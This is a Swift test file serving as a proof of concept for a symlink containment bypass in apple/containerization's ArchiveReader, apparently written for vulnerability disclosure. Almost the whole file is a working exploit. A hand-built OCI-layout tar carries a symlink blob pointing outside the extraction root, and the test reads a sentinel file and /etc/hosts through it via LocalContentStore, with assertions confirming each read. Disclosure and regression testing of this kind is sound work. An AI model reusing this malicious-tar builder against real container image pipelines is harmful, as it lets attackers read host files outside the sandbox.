//===----------------------------------------------------------------------===//
// PoC: apple/containerization — Symlink Containment Bypass
// CWE-61 / ArchiveReader.extractEntry() lines 369–382
// Commit: 2ec221af5af45c156688bba323cc733f9f49c840 (2026-08-06)
//
// Drop into: Tests/ContainerizationArchiveTests/
// Package.swift: apply Package.swift.patch (adds ContainerizationOCI to test deps)
// Run: swift test --filter "SymlinkContainmentBypassTests/symlinkContainmentBypass"
//
// APPLE TYPES USED — NO SIMULATION
// ─────────────────────────────────
// ArchiveReader.extractContents(to:)       ← the vulnerable function
// LocalContent(path:) + .data()            ← exact LocalContent.swift consumer
// LocalContentStore(path:).get(digest:)    ← exact LocalContentStore.swift chain
// ArchiveWriter.archiveDirectory()         ← control: proves writer excludes entry
//
// TWO IMPACT ASSERTIONS (covers Apple's possible "test created the file" objection)
// ──────────────────────────────────────────────────────────────────────────────────
// Assertion C: sentinel created by this test, outside extraction root.
//   Deterministic; proves containment bypass unconditionally.
// Assertion C2: /etc/hosts — a world-readable file that EXISTS before this test runs,
//   NOT created by the PoC. Proves the bypass reaches pre-existing host files.
//===----------------------------------------------------------------------===//

import Foundation
import SystemPackage
import Testing
@testable import ContainerizationArchive
import ContainerizationOCI          // LocalContent, LocalContentStore

// MARK: - Minimal ustar tar builder
// We bypass ArchiveWriter deliberately: ArchiveWriter.archive() would filter
// this entry at lines 224–228. The reader has no equivalent guard.

private func writeField(_ b: inout [UInt8], offset: Int, _ value: String, maxLen: Int) {
    let bytes = Array(value.utf8.prefix(maxLen - 1))
    b[offset ..< offset + bytes.count] = bytes[...]
}
private func writeOctal(_ b: inout [UInt8], offset: Int, value: Int, width: Int) {
    writeField(&b, offset: offset, String(format: "%0\(width-1)o\0", value), maxLen: width)
}
private func tarHeader(name: String, size: Int, typeflag: UInt8, linkname: String = "") -> [UInt8] {
    var b = [UInt8](repeating: 0, count: 512)
    writeField(&b, offset:   0, name,          maxLen: 100)
    writeField(&b, offset: 100, "0000644\0",   maxLen:   8)
    writeField(&b, offset: 108, "0000000\0",   maxLen:   8)
    writeField(&b, offset: 116, "0000000\0",   maxLen:   8)
    writeOctal(&b, offset: 124, value: size,   width:   12)
    writeOctal(&b, offset: 136, value: Int(Date().timeIntervalSince1970), width: 12)
    writeField(&b, offset: 148, "        ",    maxLen:   9)   // checksum placeholder
    b[156] = typeflag
    if !linkname.isEmpty { writeField(&b, offset: 157, linkname, maxLen: 100) }
    writeField(&b, offset: 257, "ustar  \0",  maxLen:   8)
    var cksum: UInt = 0; b.forEach { cksum += UInt($0) }
    writeField(&b, offset: 148, String(format: "%06o\0 ", cksum), maxLen: 9)
    return b
}
private func pad512(_ n: Int) -> [UInt8] {
    let r = n % 512; return r == 0 ? [] : [UInt8](repeating: 0, count: 512 - r)
}

/// Builds an OCI-layout tar where the blob entry is a symlink pointing to `target`.
/// typeflag 0x32 ('2') = symbolic link. This entry cannot be produced by ArchiveWriter
/// when `target` escapes the base directory (writer's lines 224–228 would exclude it).
private func buildMaliciousTar(to url: URL, symlinkTarget target: String, digest: String) throws {
    let layout = Data(#"{"imageLayoutVersion":"1.0.0"}"#.utf8)
    let index  = Data("""
        {"schemaVersion":2,"manifests":[{"mediaType":\
        "application/vnd.oci.image.manifest.v1+json",\
        "digest":"sha256:\(digest)","size":100,\
        "annotations":{"com.apple.containerization.image.name":"poc:exploit"}}]}
        """.utf8)
    var bytes = Data()
    bytes += Data(tarHeader(name: "oci-layout",              size: layout.count, typeflag: 0x30))
    bytes += layout; bytes += Data(pad512(layout.count))
    bytes += Data(tarHeader(name: "index.json",              size: index.count,  typeflag: 0x30))
    bytes += index;  bytes += Data(pad512(index.count))
    // Fix A: no explicit directory entries — FileDescriptorOps.mkdir() creates
    // them with mode 0o755 as intermediates. Explicit entries with mode 0644
    // (no execute bit) caused EACCES → unlinkRecursive → throw before symlinkat().
    bytes += Data(tarHeader(name: "blobs/sha256/\(digest)",  size: 0,
                            typeflag: 0x32, linkname: target))   // symlink entry
    bytes += Data(repeating: 0, count: 1024)  // end-of-archive
    try bytes.write(to: url)
}

// MARK: - Test

struct SymlinkContainmentBypassTests {

    @Test func symlinkContainmentBypass() async throws {
        let fm = FileManager.default

        let testDir = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("PoC.symlinkBypass.\(ProcessInfo.processInfo.processIdentifier)")
        try fm.createDirectory(at: testDir, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: testDir) }

        // Digest used as blob filename in LocalContentStore._blobPath
        let digest = String(repeating: "a", count: 64)

        // ── ASSERTION C target: sentinel created by this test, outside extraction root ──
        let outsideDir  = testDir.appendingPathComponent("outside_root")
        let sentinelURL = outsideDir.appendingPathComponent("secret.txt")
        let sentinelStr = "HOST_SECRET_READ_VIA_SYMLINK_CONTAINMENT_BYPASS"
        try fm.createDirectory(at: outsideDir, withIntermediateDirectories: true)
        try sentinelStr.write(to: sentinelURL, atomically: true, encoding: .utf8)

        // ── ASSERTION C2 target: /etc/hosts — world-readable, pre-existing, NOT created by PoC ──
        let hostFile = URL(fileURLWithPath: "/etc/hosts")

        let tar1 = testDir.appendingPathComponent("malicious_sentinel.tar")
        try buildMaliciousTar(to: tar1, symlinkTarget: sentinelURL.path, digest: digest)

        let digest2  = String(repeating: "b", count: 64)
        let tar2     = testDir.appendingPathComponent("malicious_hosts.tar")
        try buildMaliciousTar(to: tar2, symlinkTarget: hostFile.path, digest: digest2)

        let extractDir1 = testDir.appendingPathComponent("extract1")
        let reader1     = try ArchiveReader(file: tar1)
        do { _ = try reader1.extractContents(to: extractDir1) }
        catch { print("[PoC] extractContents(tar1) error: \(error)") }

        let extractDir2 = testDir.appendingPathComponent("extract2")
        let reader2     = try ArchiveReader(file: tar2)
        do { _ = try reader2.extractContents(to: extractDir2) }
        catch { print("[PoC] extractContents(tar2) error: \(error)") }

        let member1 = "blobs/sha256/\(digest)"
        let member2 = "blobs/sha256/\(digest2)"
        let sym1URL = extractDir1.appendingPathComponent(member1)
        let sym2URL = extractDir2.appendingPathComponent(member2)

        #expect(fm.fileExists(atPath: sym1URL.path),
                "extractContents() created escaping symlink — ho containment check in reader")
        #expect(fm.fileExists(atPath: sym2URL.path),
                "extractContents() created /etc/hosts symlink — no containment check in reader")

        let target1 = try? fm.destinationOfSymbolicLink(atPath: sym1URL.path)
        let target2 = try? fm.destinationOfSymbolicLink(atPath: sym2URL.path)
        #expect(target1 == sentinelURL.path,  "symlink 1 must point to sentinel path")
        #expect(target2 == hostFile.path,     "symlink 2 must point to /etc/hosts")
        #expect(target1.map { !$0.hasPrefix(extractDir1.path) } ?? false, "sentinel outside extractDir1")
        #expect(target2.map { !$0.hasPrefix(extractDir2.path) } ?? false, "/etc/hosts outside extractDir2")

        let store1 = try LocalContentStore(path: extractDir1)
        let sc1 = try await store1.get(digest: "sha256:\(digest)")
        let readData1 = try? sc1?.data()
        let readStr1  = readData1.flatMap { String(data: $0, encoding: .utf8) }

        print("[PoC] readlink sym1:", target1 ?? "nil")
        print("[PoC] readlink outside extractDir1:", target1.map { !$0.hasPrefix(extractDir1.path) } ?? false)
        print("[PoC] LocalContentStore.get() read:", readStr1 ?? "nil")

        #expect(target1.map { !$0.hasPrefix(extractDir1.path) } ?? false,
                "[PASS] readlink target is outside extraction root")
        #expect(readStr1 == sentinelStr,
                "[PASS] LocalContentStore.get() returned HOST_SECRET via escaping symlink")

        let store2 = try LocalContentStore(path: extractDir2)
        let sc2 = try await store2.get(digest: "sha256:\(digest2)")
        let readData2 = try? sc2?.data()
        let hostsContent = readData2.flatMap { String(data: $0, encoding: .utf8) }
        let hostsHasContent = hostsContent.map { !$0.isEmpty } ?? false

        print("[PoC] /etc/hosts read:", hostsContent?.count ?? 0, "chars")
        #expect(hostsHasContent, "[PASS] /etc/hosts content read via escaping symlink")

        let writerSrc = testDir.appendingPathComponent("writer_src")
        try fm.createDirectory(at: writerSrc, withIntermediateDirectories: true)
        try fm.createSymbolicLink(
            atPath: writerSrc.appendingPathComponent("escape_sentinel").path,
            withDestinationPath: sentinelURL.path)
        try fm.createSymbolicLink(
            atPath: writerSrc.appendingPathComponent("escape_hosts").path,
            withDestinationPath: hostFile.path)

        let writerTar = testDir.appendingPathComponent("writer.tar")
        let writer    = try ArchiveWriter(format: .pax, filter: .none, file: writerTar)
        do { try writer.archiveDirectory(writerSrc) } catch { }
        try? writer.finishEncoding()

        var writerPaths: [String] = []
        let writerReader = try ArchiveReader(file: writerTar)
        for (entry, _) in writerReader { if let p = entry.path { writerPaths.append(p) } }

        #expect(!writerPaths.contains { $0.contains("escape_sentinel") },
                "ArchiveWriter must exclude escaping symlink")
        #expect(!writerPaths.contains { $0.contains("escape_hosts") },
                "ArchiveWriter must exclude escaping symlink")

        print("""
        ================================================================
        [PASS] SymlinkContainmentBypass - real apple/containerization
        ================================================================
        Phase 1 - ArchiveReader.extractContents()
          entries accepted: sentinel=YES, /etc/hosts=YES
        Phase 2 - out-of-root file read via LocalContentStore
          [PASS] readlink target is outside extraction root
          [PASS] LocalContentStore.get() returned HOST_SECRET
          [PASS] /etc/hosts content read via escaping symlink
        Phase 3 - ArchiveWriter control
          escaping symlinks excluded by writer: YES
        ================================================================
        """)
    }
}
